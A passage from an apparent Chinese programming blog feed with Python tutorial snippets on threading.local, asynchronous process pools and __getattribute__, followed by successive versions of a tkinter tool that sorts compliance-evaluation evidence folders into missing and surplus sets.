创建全局ThreadLocal对象:</span><br><span class="line">local = threading.local()</span><br><span class="line"></span><br><span class="line">def student():</span><br><span class="line">    # 获取当前线程关联的student:</span><br><span class="line">    std = local.student</span><br><span class="line">    print(&apos;这是线程：%s，线程名：%s，使用了ThreadLocal对象之后，我和另外一个线程的变量不会冲突。&apos; % (std, threading.current_thread().name))</span><br><span class="line"></span><br><span class="line">def thread(name):</span><br><span class="line">    # 绑定ThreadLocal的student:</span><br><span class="line">    local.student = name</span><br><span class="line">    student()</span><br><span class="line"></span><br><span class="line">threadone = threading.Thread(target= thread, args=(&apos;threadone&apos;,), name=&apos;Thread-A&apos;)</span><br><span class="line">threadtwo = threading.Thread(target= thread, args=(&apos;threadtwo&apos;,), name=&apos;Thread-B&apos;)</span><br><span class="line">threadone.start()</span><br><span class="line">threadtwo.start()</span><br></pre></td></tr></table></figure><h3 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from multiprocessing import Pool</span><br><span class="line">import time</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">def add_pool():</span><br><span class="line">    print(&quot;我是进程池中的进程，我的PID号是：%d，主线程的PID号是：%d&quot; % (os.getpid(),os.getppid()))</span><br><span class="line">    for i in range(3):</span><br><span class="line">        time.sleep(1)</span><br><span class="line">    return &quot;我是进程池中的进程，我的PID号是：%d，我的进程已经结束，并return返回了这句话，交给主线程去做。&quot; % os.getpid()</span><br><span class="line"></span><br><span class="line">def add_callback(args):</span><br><span class="line">    print(&quot;我是回调函数的线程，我的PID号是：%d，看起来，进程池中的进程已经运行结束了，并留下了一句话：&quot; % os.getpid())</span><br><span class="line">    print(args)</span><br><span class="line"></span><br><span class="line">#创建一个进程池，里边有三个进程。</span><br><span class="line">pool = Pool(3)</span><br><span class="line">#进程的目标是处理add_pool函数内容，回调函数的目标是add_callback。</span><br><span class="line">pool.apply_async(func=add_pool,callback=add_callback)</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    print(&quot;我是主进程，我的PID号是：%d，我一直在无聊的打印，并且在等待回调函数交代我做事，但是我不知道回调函数什么时候让我去做，大概只有进程池中的函数执行完了，回调函数才会过来交代是什么事情，大多数开发者称之为异步&quot;%os.getpid())</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 内建属性</title>
      <link href="/article/python-property.html"/>
      <url>/article/python-property.html</url>
      
        <content type="html"><![CDATA[<h3 id="getattribute"><a href="#getattribute" class="headerlink" title="getattribute"></a><strong>getattribute</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">class Itcast(object):</span><br><span class="line">    def __init__(self,one):</span><br><span class="line">        self.one = one</span><br><span class="line">        self.two = &apos;这是第二条属性的值。&apos;</span><br><span class="line"></span><br><span class="line">    #属性访问时拦截器，可以用来记录日志等</span><br><span class="line">    def __getattribute__(self,building):</span><br><span class="line">        if building == &apos;one&apos;:</span><br><span class="line">            print(&apos;已经拦截属性，拦截方式：在执行第19行代码时，执行该拦截器，并把one当做字符串赋值给第7行代码的building，if判断成立后执行这一行代码。&apos;)</span><br><span class="line">            return &apos;我这是return功能，作为值返回。第19行代码作为接收。&apos;</span><br><span class="line">        #测试时注释掉这2行，将找不到two</span><br><span class="line">        else:</span><br><span class="line">            return object.__getattribute__(self,building)</span><br><span class="line"></span><br><span class="line">    def show(self):</span><br><span class="line">        print(&apos;当执行第22行代码时，会先执行这个函数，然后把这个函数的值传给第7行代码的building。&apos;)</span><br><span class="line"></span><br><span class="line">#执行类，并赋值给__init__函数的one，返回的结果赋值给building</span><br><span class="line">building = Itcast(&quot;内建属性拦截器&quot;)</span><br><span class="line">print(building.one)</span><br><span class="line">print(building.two)</span><br><span class="line">building.show()</span><br></pre></td></tr></table></figure><p>注意：不能在<strong>getattribute</strong>方法中调用self.函数，否则会造成死循环。</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 符合性评测表材料对比工具</title>
      <link href="/article/refuse-contrast.html"/>
      <url>/article/refuse-contrast.html</url>
      
        <content type="html"><![CDATA[<p>下载链接：</p><h3 id="2018年7月24日"><a href="#2018年7月24日" class="headerlink" title="2018年7月24日"></a>2018年7月24日</h3><p>精妙绝伦</p><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">import shutil</span><br><span class="line">from tkinter import *</span><br><span class="line">import tkinter.messagebox</span><br><span class="line">from tkinter.filedialog import askdirectory</span><br><span class="line">from tkinter.scrolledtext import ScrolledText</span><br><span class="line"></span><br><span class="line">class RSAS_GUI():</span><br><span class="line">    def __init__(self,init_window_name):</span><br><span class="line">        self.init_window_name = init_window_name</span><br><span class="line">        self.init_window_name.title(&apos;符合性评测证明材料对比工具1.0&apos;)</span><br><span class="line">        self.init_window_name.resizable(width=False, height=False)</span><br><span class="line">        self.start_path = StringVar()</span><br><span class="line">        self.end_path = StringVar()</span><br><span class="line"></span><br><span class="line">        self.screenwidth = self.init_window_name.winfo_screenwidth()</span><br><span class="line">        self.screenheight = self.init_window_name.winfo_screenheight()</span><br><span class="line">        self.size = &apos;%dx%d+%d+%d&apos; % (590, 340, (self.screenwidth - 590)/2, (self.screenheight - 340)/2)</span><br><span class="line">        self.init_window_name.geometry(self.size)</span><br><span class="line"></span><br><span class="line">    def startPath(self):</span><br><span class="line">        self.path_start = askdirectory()</span><br><span class="line">        self.start_path.set(self.path_start)</span><br><span class="line"></span><br><span class="line">    def set_init_window(self):</span><br><span class="line">        self.init_data_label = Label(self.init_window_name,text = &quot;选择对比路径:&quot;).grid(row = 0, column = 0)</span><br><span class="line">        self.init_data_entry = Entry(self.init_window_name, textvariable = self.start_path, width=20).grid(row = 0, column = 1)</span><br><span class="line">        self.init_data_button = Button(self.init_window_name, text = &quot;选择文件夹&quot;, width=10,command = self.startPath).grid(row = 0, column = 2)</span><br><span class="line"></span><br><span class="line">        self.log_label = Label(self.init_window_name, text=&quot;请输入序号：&quot;).grid(row=2, column=0)</span><br><span class="line">        self.log_label_Text = ScrolledText(self.init_window_name, width=18, height=21)</span><br><span class="line">        self.log_label_Text.grid(row=3, column=0, columnspan=1)</span><br><span class="line"></span><br><span class="line">        self.log_flag_num = Label(self.init_window_name, text=&quot;数据统计&quot;).grid(row=2, column=1)</span><br><span class="line">        self.log_flag_num = ScrolledText(self.init_window_name, width=18, height=21)</span><br><span class="line">        self.log_flag_num.grid(row=3, column=1, columnspan=1)</span><br><span class="line"></span><br><span class="line">        self.log_lack = Label(self.init_window_name, text=&quot;缺少证明序号：&quot;).grid(row=2, column=2)</span><br><span class="line">        self.log_lack = ScrolledText(self.init_window_name, width=18, height=21)</span><br><span class="line">        self.log_lack.grid(row=3, column=2, columnspan=1)</span><br><span class="line"></span><br><span class="line">        self.log_uncalled = Label(self.init_window_name, text=&quot;多余证明材料：&quot;).grid(row=2, column=3)</span><br><span class="line">        self.log_uncalled = ScrolledText(self.init_window_name, width=18, height=21)</span><br><span class="line">        self.log_uncalled.grid(row=3, column=3, columnspan=1)</span><br><span class="line"></span><br><span class="line">        self.export_log = Button(self.init_window_name, text=&quot;开始查找&quot;, width=10,command=self.main)</span><br><span class="line">        self.export_log.grid(row=0, column=3)</span><br><span class="line"></span><br><span class="line">    def main(self):</span><br><span class="line"></span><br><span class="line">        number = &apos;([\d-]+)&apos;</span><br><span class="line"></span><br><span class="line">        lists = self.log_label_Text.get(1.0,END).strip().replace(&quot; &quot;,&quot;&quot;).replace(&apos;&quot;&apos;,&quot;&quot;)</span><br><span class="line">        lists = lists.split(&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">        excel_list = []</span><br><span class="line">        folder_list = []</span><br><span class="line"></span><br><span class="line">        folder_start = self.path_start</span><br><span class="line"></span><br><span class="line">        try:</span><br><span class="line">            shutil.rmtree(folder_start+&apos;\\&apos; + &apos;缺&apos;)</span><br><span class="line">            shutil.rmtree(folder_start+&apos;\\&apos; + &apos;多余材料&apos;)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line">        flag = []</span><br><span class="line">        for content in lists:</span><br><span class="line">            if content[0].isdigit() == False:</span><br><span class="line">                flag.append(content)</span><br><span class="line">                if len(flag) &gt; 1:</span><br><span class="line">                    log_num = [flag[0],i]</span><br><span class="line">                    self.flag_num(&apos;%s：%s&apos; % (log_num[0],log_num[1]))</span><br><span class="line">                    del flag[0]</span><br><span class="line">                i = 0</span><br><span class="line">            else:</span><br><span class="line">                i += 1</span><br><span class="line">        log_num = [flag[0],i]</span><br><span class="line">        self.flag_num(&apos;%s：%s&apos; % (log_num[0],log_num[1]))</span><br><span class="line"></span><br><span class="line">        for content in lists:</span><br><span class="line">            content = re.findall(number,content)</span><br><span class="line">            if len(content[0]) &gt; 5:</span><br><span class="line">                excel_list.append(content[0])</span><br><span class="line"></span><br><span class="line">        dirList = os.listdir(folder_start)</span><br><span class="line">        for content in dirList:</span><br><span class="line">            folder_list.append(content)</span><br><span class="line"></span><br><span class="line">        x = 0</span><br><span class="line">        os.mkdir(folder_start+&apos;\\&apos; + &apos;缺&apos;)</span><br><span class="line">        for excel_txt in excel_list:</span><br><span class="line">            for folder_txt in folder_list:</span><br><span class="line">                if excel_txt == folder_txt:</span><br><span class="line">                    dir_List = os.listdir(folder_start + &apos;\\&apos; + excel_txt)</span><br><span class="line">                    if dir_List:</span><br><span class="line">                        pass</span><br><span class="line">                    else:</span><br><span class="line">                        shutil.move(folder_start + &apos;\\&apos; + excel_txt,folder_start + &apos;\\&apos; + &apos;缺\\&apos; + excel_txt)</span><br><span class="line">                        self.lack(excel_txt)</span><br><span class="line">                    break</span><br><span class="line">            else:</span><br><span class="line">                try:</span><br><span class="line">                    os.mkdir(folder_start+&apos;\\缺\\&apos; + excel_txt)</span><br><span class="line">                    self.lack(excel_txt)</span><br><span class="line">                    x += 1</span><br><span class="line">                except Exception as e:</span><br><span class="line">                    pass</span><br><span class="line"></span><br><span class="line">        i = 0</span><br><span class="line">        os.mkdir(folder_start+&apos;\\&apos; + &apos;多余材料&apos;)</span><br><span class="line">        for folder_txt in folder_list:</span><br><span class="line">            for excel_txt in excel_list:</span><br><span class="line">                if folder_txt == excel_txt:</span><br><span class="line">                    break</span><br><span class="line">            else:</span><br><span class="line">                try:</span><br><span class="line">                    start = folder_start+&apos;\\&apos; + folder_txt</span><br><span class="line">                    end = folder_start+&apos;\\多余材料\\&apos; + folder_txt</span><br><span class="line">                    self.uncalled(folder_txt)</span><br><span class="line">                    i += 1</span><br><span class="line">                    shutil.move(start,end)</span><br><span class="line">                except Exception as e:</span><br><span class="line">                    pass</span><br><span class="line"></span><br><span class="line">    def uncalled(self,logmsg):</span><br><span class="line">        global LOG_LINE_NUM</span><br><span class="line">        logmsg_in = str(logmsg) + &quot;\n&quot;</span><br><span class="line">        self.log_uncalled.insert(END, logmsg_in)</span><br><span class="line">        self.log_uncalled.update()</span><br><span class="line">        self.log_uncalled.see(END)</span><br><span class="line">        LOG_LINE_NUM = LOG_LINE_NUM + 1</span><br><span class="line"></span><br><span class="line">    def lack(self,logmsg):</span><br><span class="line">        global LOG_LINE_NUM</span><br><span class="line">        logmsg_in = str(logmsg) + &quot;\n&quot;</span><br><span class="line">        self.log_lack.insert(END, logmsg_in)</span><br><span class="line">        self.log_lack.update()</span><br><span class="line">        self.log_lack.see(END)</span><br><span class="line">        LOG_LINE_NUM = LOG_LINE_NUM + 1</span><br><span class="line"></span><br><span class="line">    def flag_num(self,logmsg):</span><br><span class="line">        global LOG_LINE_NUM</span><br><span class="line">        logmsg_in = str(logmsg) + &quot;\n&quot;</span><br><span class="line">        self.log_flag_num.insert(END, logmsg_in)</span><br><span class="line">        self.log_flag_num.update()</span><br><span class="line">        self.log_flag_num.see(END)</span><br><span class="line">        LOG_LINE_NUM = LOG_LINE_NUM + 1</span><br><span class="line"></span><br><span class="line">def gui_start():</span><br><span class="line">    init_window = Tk()</span><br><span class="line">    ZMJ_PORTAL = RSAS_GUI(init_window)</span><br><span class="line">    ZMJ_PORTAL.set_init_window()</span><br><span class="line">    init_window.mainloop()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    LOG_LINE_NUM = 0</span><br><span class="line">    gui_start()</span><br></pre></td></tr></table></figure><hr><h3 id="2018年7月22日"><a href="#2018年7月22日" class="headerlink" title="2018年7月22日"></a>2018年7月22日</h3><p>TK：输入框、文本框、滚动条。</p><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">import shutil</span><br><span class="line">from tkinter import *</span><br><span class="line">import tkinter.messagebox</span><br><span class="line">from tkinter.filedialog import askdirectory</span><br><span class="line">from tkinter.scrolledtext import ScrolledText</span><br><span class="line"></span><br><span class="line">class RSAS_GUI():</span><br><span class="line">    def __init__(self,init_window_name):</span><br><span class="line">        self.init_window_name = init_window_name</span><br><span class="line">        self.init_window_name.title(&apos;符合性评测证明材料对比工具1.0&apos;)</span><br><span class="line">        self.init_window_name.resizable(width=False, height=False)</span><br><span class="line">        self.start_path = StringVar()</span><br><span class="line">        self.end_path = StringVar()</span><br><span class="line"></span><br><span class="line">        self.screenwidth = self.init_window_name.winfo_screenwidth()</span><br><span class="line">        self.screenheight = self.init_window_name.winfo_screenheight()</span><br><span class="line">        self.size = &apos;%dx%d+%d+%d&apos; % (600, 340, (self.screenwidth - 600)/2, (self.screenheight - 340)/2)</span><br><span class="line">        self.init_window_name.geometry(self.size)</span><br><span class="line"></span><br><span class="line">    def startPath(self):</span><br><span class="line">        self.path_start = askdirectory()</span><br><span class="line">        self.start_path.set(self.path_start)</span><br><span class="line"></span><br><span class="line">    def set_init_window(self):</span><br><span class="line">        self.init_data_label = Label(self.init_window_name,text = &quot;选择对比路径:&quot;).grid(row = 0, column = 0)</span><br><span class="line">        self.init_data_entry = Entry(self.init_window_name, textvariable = self.start_path, width=30).grid(row = 0, column = 1)</span><br><span class="line">        self.init_data_button = Button(self.init_window_name, text = &quot;选择文件夹&quot;, width=10,command = self.startPath).grid(row = 0, column = 2)</span><br><span class="line"></span><br><span class="line">        self.log_label = Label(self.init_window_name, text=&quot;请输入序号：&quot;).grid(row=2, column=0)</span><br><span class="line">        self.log_label_Text = ScrolledText(self.init_window_name, width=18, height=21)</span><br><span class="line">        self.log_label_Text.grid(row=3, column=0, columnspan=1)</span><br><span class="line"></span><br><span class="line">        self.log_lack = Label(self.init_window_name, text=&quot;缺少证明序号：&quot;).grid(row=2, column=1)</span><br><span class="line">        self.log_lack = ScrolledText(self.init_window_name, width=18, height=21)</span><br><span class="line">        self.log_lack.grid(row=3, column=1, columnspan=1)</span><br><span class="line"></span><br><span class="line">        self.log_uncalled = Label(self.init_window_name, text=&quot;多余证明材料：&quot;).grid(row=2, column=2)</span><br><span class="line">        self.log_uncalled = ScrolledText(self.init_window_name, width=18, height=21)</span><br><span class="line">        self.log_uncalled.grid(row=3, column=2, columnspan=1)</span><br><span class="line"></span><br><span class="line">        self.export_log = Button(self.init_window_name, text=&quot;开始查找&quot;, width=10,command=self.main)</span><br><span class="line">        self.export_log.grid(row=0, column=3)</span><br><span class="line"></span><br><span class="line">    def main(self):</span><br><span class="line"></span><br><span class="line">        number = &apos;([\d-]+)&apos;</span><br><span class="line"></span><br><span class="line">        lists = self.log_label_Text.get(1.0,END).strip().replace(&quot; &quot;,&quot;&quot;).replace(&apos;&quot;&apos;,&quot;&quot;)</span><br><span class="line">        lists = lists.split(&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">        excel_list = []</span><br><span class="line">        folder_list = []</span><br><span class="line"></span><br><span class="line">        folder_start = self.path_start</span><br><span class="line"></span><br><span class="line">        for content in lists:</span><br><span class="line">            content = re.findall(number,content)</span><br><span class="line">            if len(content[0]) &gt; 2:</span><br><span class="line">                excel_list.append(content[0])</span><br><span class="line"></span><br><span class="line">        dirList = os.listdir(folder_start)</span><br><span class="line">        for content in dirList:</span><br><span class="line">            folder_list.append(content)</span><br><span class="line"></span><br><span class="line">        x = 0</span><br><span class="line">        os.mkdir(folder_start+&apos;\\&apos; + &apos;缺&apos;)</span><br><span class="line">        for excel_txt in excel_list:</span><br><span class="line">            for folder_txt in folder_list:</span><br><span class="line">                if excel_txt == folder_txt:</span><br><span class="line">                    break</span><br><span class="line">            else:</span><br><span class="line">                try:</span><br><span class="line">                    os.mkdir(folder_start+&apos;\\缺\\&apos; + excel_txt)</span><br><span class="line">                    self.lack(excel_txt)</span><br><span class="line">                    x += 1</span><br><span class="line">                except Exception as e:</span><br><span class="line">                    pass</span><br><span class="line"></span><br><span class="line">        i = 0</span><br><span class="line">        os.mkdir(folder_start+&apos;\\&apos; + &apos;多余材料&apos;)</span><br><span class="line">        for folder_txt in folder_list:</span><br><span class="line">            for excel_txt in excel_list:</span><br><span class="line">                if folder_txt == excel_txt:</span><br><span class="line">                    break</span><br><span class="line">            else:</span><br><span class="line">                try:</span><br><span class="line">                    start = folder_start+&apos;\\&apos; + folder_txt</span><br><span class="line">                    end = folder_start+&apos;\\多余材料\\&apos; + folder_txt</span><br><span class="line">                    self.uncalled(folder_txt)</span><br><span class="line">                    i += 1</span><br><span class="line">                    shutil.move(start,end)</span><br><span class="line">                except Exception as e:</span><br><span class="line">                    pass</span><br><span class="line"></span><br><span class="line">    def uncalled(self,logmsg):</span><br><span class="line">        global LOG_LINE_NUM</span><br><span class="line">        logmsg_in = str(logmsg) + &quot;\n&quot;</span><br><span class="line">        self.log_uncalled.insert(END, logmsg_in)</span><br><span class="line">        self.log_uncalled.update()</span><br><span class="line">        self.log_uncalled.see(END)</span><br><span class="line">        LOG_LINE_NUM = LOG_LINE_NUM + 1</span><br><span class="line"></span><br><span class="line">    def lack(self,logmsg):</span><br><span class="line">        global LOG_LINE_NUM</span><br><span class="line">        logmsg_in = str(logmsg) + &quot;\n&quot;</span><br><span class="line">        self.log_lack.insert(END, logmsg_in)</span><br><span class="line">        self.log_lack.update()</span><br><span class="line">        self.log_lack.see(END)</span><br><span class="line">        LOG_LINE_NUM = LOG_LINE_NUM + 1</span><br><span class="line"></span><br><span class="line">def gui_start():</span><br><span class="line">    init_window = Tk()</span><br><span class="line">    ZMJ_PORTAL = RSAS_GUI(init_window)</span><br><span class="line">    ZMJ_PORTAL.set_init_window()</span><br><span class="line">    init_window.mainloop()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    LOG_LINE_NUM = 0</span><br><span class="line">    gui_start()</span><br></pre></td></tr></table></figure><hr><p>代码：</p><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">import shutil</span><br><span class="line">from tkinter import *</span><br><span class="line">import tkinter.messagebox</span><br><span class="line">from tkinter.filedialog import askdirectory</span><br><span class="line"></span><br><span class="line">class RSAS_GUI():</span><br><span class="line">    def __init__(self,init_window_name):</span><br><span class="line">        self.init_window_name = init_window_name</span><br><span class="line">        self.init_window_name.title(&apos;符合性评测证明材料对比工具1.0&apos;)</span><br><span class="line">        self.init_window_name.resizable(width=False, height=False)</span><br><span class="line">        self.start_path = StringVar()</span><br><span class="line">        self.end_path = StringVar()</span><br><span class="line">  </span><br><span class="line">        self.screenwidth = self.init_window_name.winfo_screenwidth()</span><br><span class="line">        self.screenheight = self.init_window_name.winfo_screenheight()</span><br><span class="line">        self.size = &apos;%dx%d+%d+%d&apos; % (465, 340, (self.screenwidth - 465)/2, (self.screenheight - 340)/2)</span><br><span class="line">        